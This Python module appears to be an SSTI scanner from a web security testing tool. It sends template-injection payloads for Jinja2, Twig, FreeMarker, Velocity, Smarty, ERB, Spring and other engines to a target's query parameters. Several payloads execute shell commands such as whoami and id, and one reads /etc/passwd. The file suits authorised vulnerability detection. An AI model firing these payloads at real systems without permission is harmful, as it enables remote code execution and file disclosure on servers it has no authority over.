
"""
Server-Side Template Injection (SSTI) Scanner
Tests for template injection vulnerabilities
"""
import logging
from typing import List
from .base import BaseScanner, Vulnerability
from ..core.target import Target

logger = logging.getLogger(__name__)

class SSTIScanner(BaseScanner):
    """Scanner for detecting Server-Side Template Injection"""
    
    def __init__(self, session):
        super().__init__(session)
        self.name = "SSTI Scanner"
    
    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        """Scan target for SSTI vulnerabilities"""
        vulnerabilities = []
        logger.info(f"Starting SSTI scan on {target.url}")
        
        # SSTI payloads for different template engines
        payloads = [
            # Jinja2 (Python - Flask/Django)
            ('{{7*7}}', '49'),
            ('{{7*\'7\'}}', '7777777'),
            ('{{config}}', 'SECRET'),
            ('{{self}}', 'self'),
            ('{{request}}', 'request'),
            ('{{config.items()}}', 'dict_items'),
            # Code execution
            ('{{self.__init__.__globals__}}', '__builtins__'),
            ('{{request.application.__globals__}}', '__builtins__'),
            
            # Twig (PHP)
            ('{{7*7}}', '49'),
            ('{{7*\'7\'}}', '7777777'),
            ('{{_self}}', 'Twig'),
            ('{{dump(app)}}', 'Symfony'),
            
            # FreeMarker (Java)
            ('${7*7}', '49'),
            ('${7*\'7\'}', '49'),
            ('${class.classLoader}', 'ClassLoader'),
            # Code execution attempt
            ('${"freemarker.template.utility.Execute"?new()("whoami")}', 'root'),
            
            # Velocity (Java)
            ('#set($x=7*7)$x', '49'),
            ('$class.inspect("java.lang.Runtime").type.getRuntime())', 'Runtime'),
            
            # Smarty (PHP)
            ('{$smarty.version}', 'Smarty'),
            ('{7*7}', '49'),
            ('{php}echo `id`;{/php}', 'uid='),
            
            # Handlebars (Node.js)
            ('{{7*7}}', '49'),
            ('{{this}}', 'object'),
            
            # ERB (Ruby)
            ('<%= 7*7 %>', '49'),
            ('<%= system("whoami") %>', 'root'),
            ('<%= `id` %>', 'uid='),
            ('<%= File.open("/etc/passwd").read %>', 'root:'),
            
            # Thymeleaf (Java)
            ('#{7*7}', '49'),
            ('[[${7*7}]]', '49'),
            ('[(${7*7})]', '49'),
            
            # Mako (Python)
            ('${7*7}', '49'),
            ('<%=7*7%>', '49'),
            
            # Tornado (Python)
            ('{{7*7}}', '49'),
            
            # Polyglot payloads (multiple engines)
            ('{{7*7}}${7*7}<%= 7*7 %>#{7*7}', '49'),
            
            # Expression Language (Java)
            ('${7*7}', '49'),
            ('#{7*7}', '49'),
            
            # Spring View Manipulation
            ('__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::.x', 'root'),
        ]
        
        for payload, expected in payloads:
            try:
                # Test in query parameter
                response = self.session.get(
                    target.url,
                    params={'name': payload, 'input': payload},
                    timeout=5
                )
                
                if expected in response.text:
                    vulnerabilities.append(Vulnerability(
                        name="Server-Side Template Injection",
                        severity="CRITICAL",
                        description="Template injection allows server-side code execution",
                        evidence=f"Payload '{payload}' executed, found '{expected}' in response",
                        url=target.url
                    ))
                    return vulnerabilities
                    
            except Exception as e:
                logger.debug(f"Error testing SSTI: {e}")
        
        return vulnerabilities
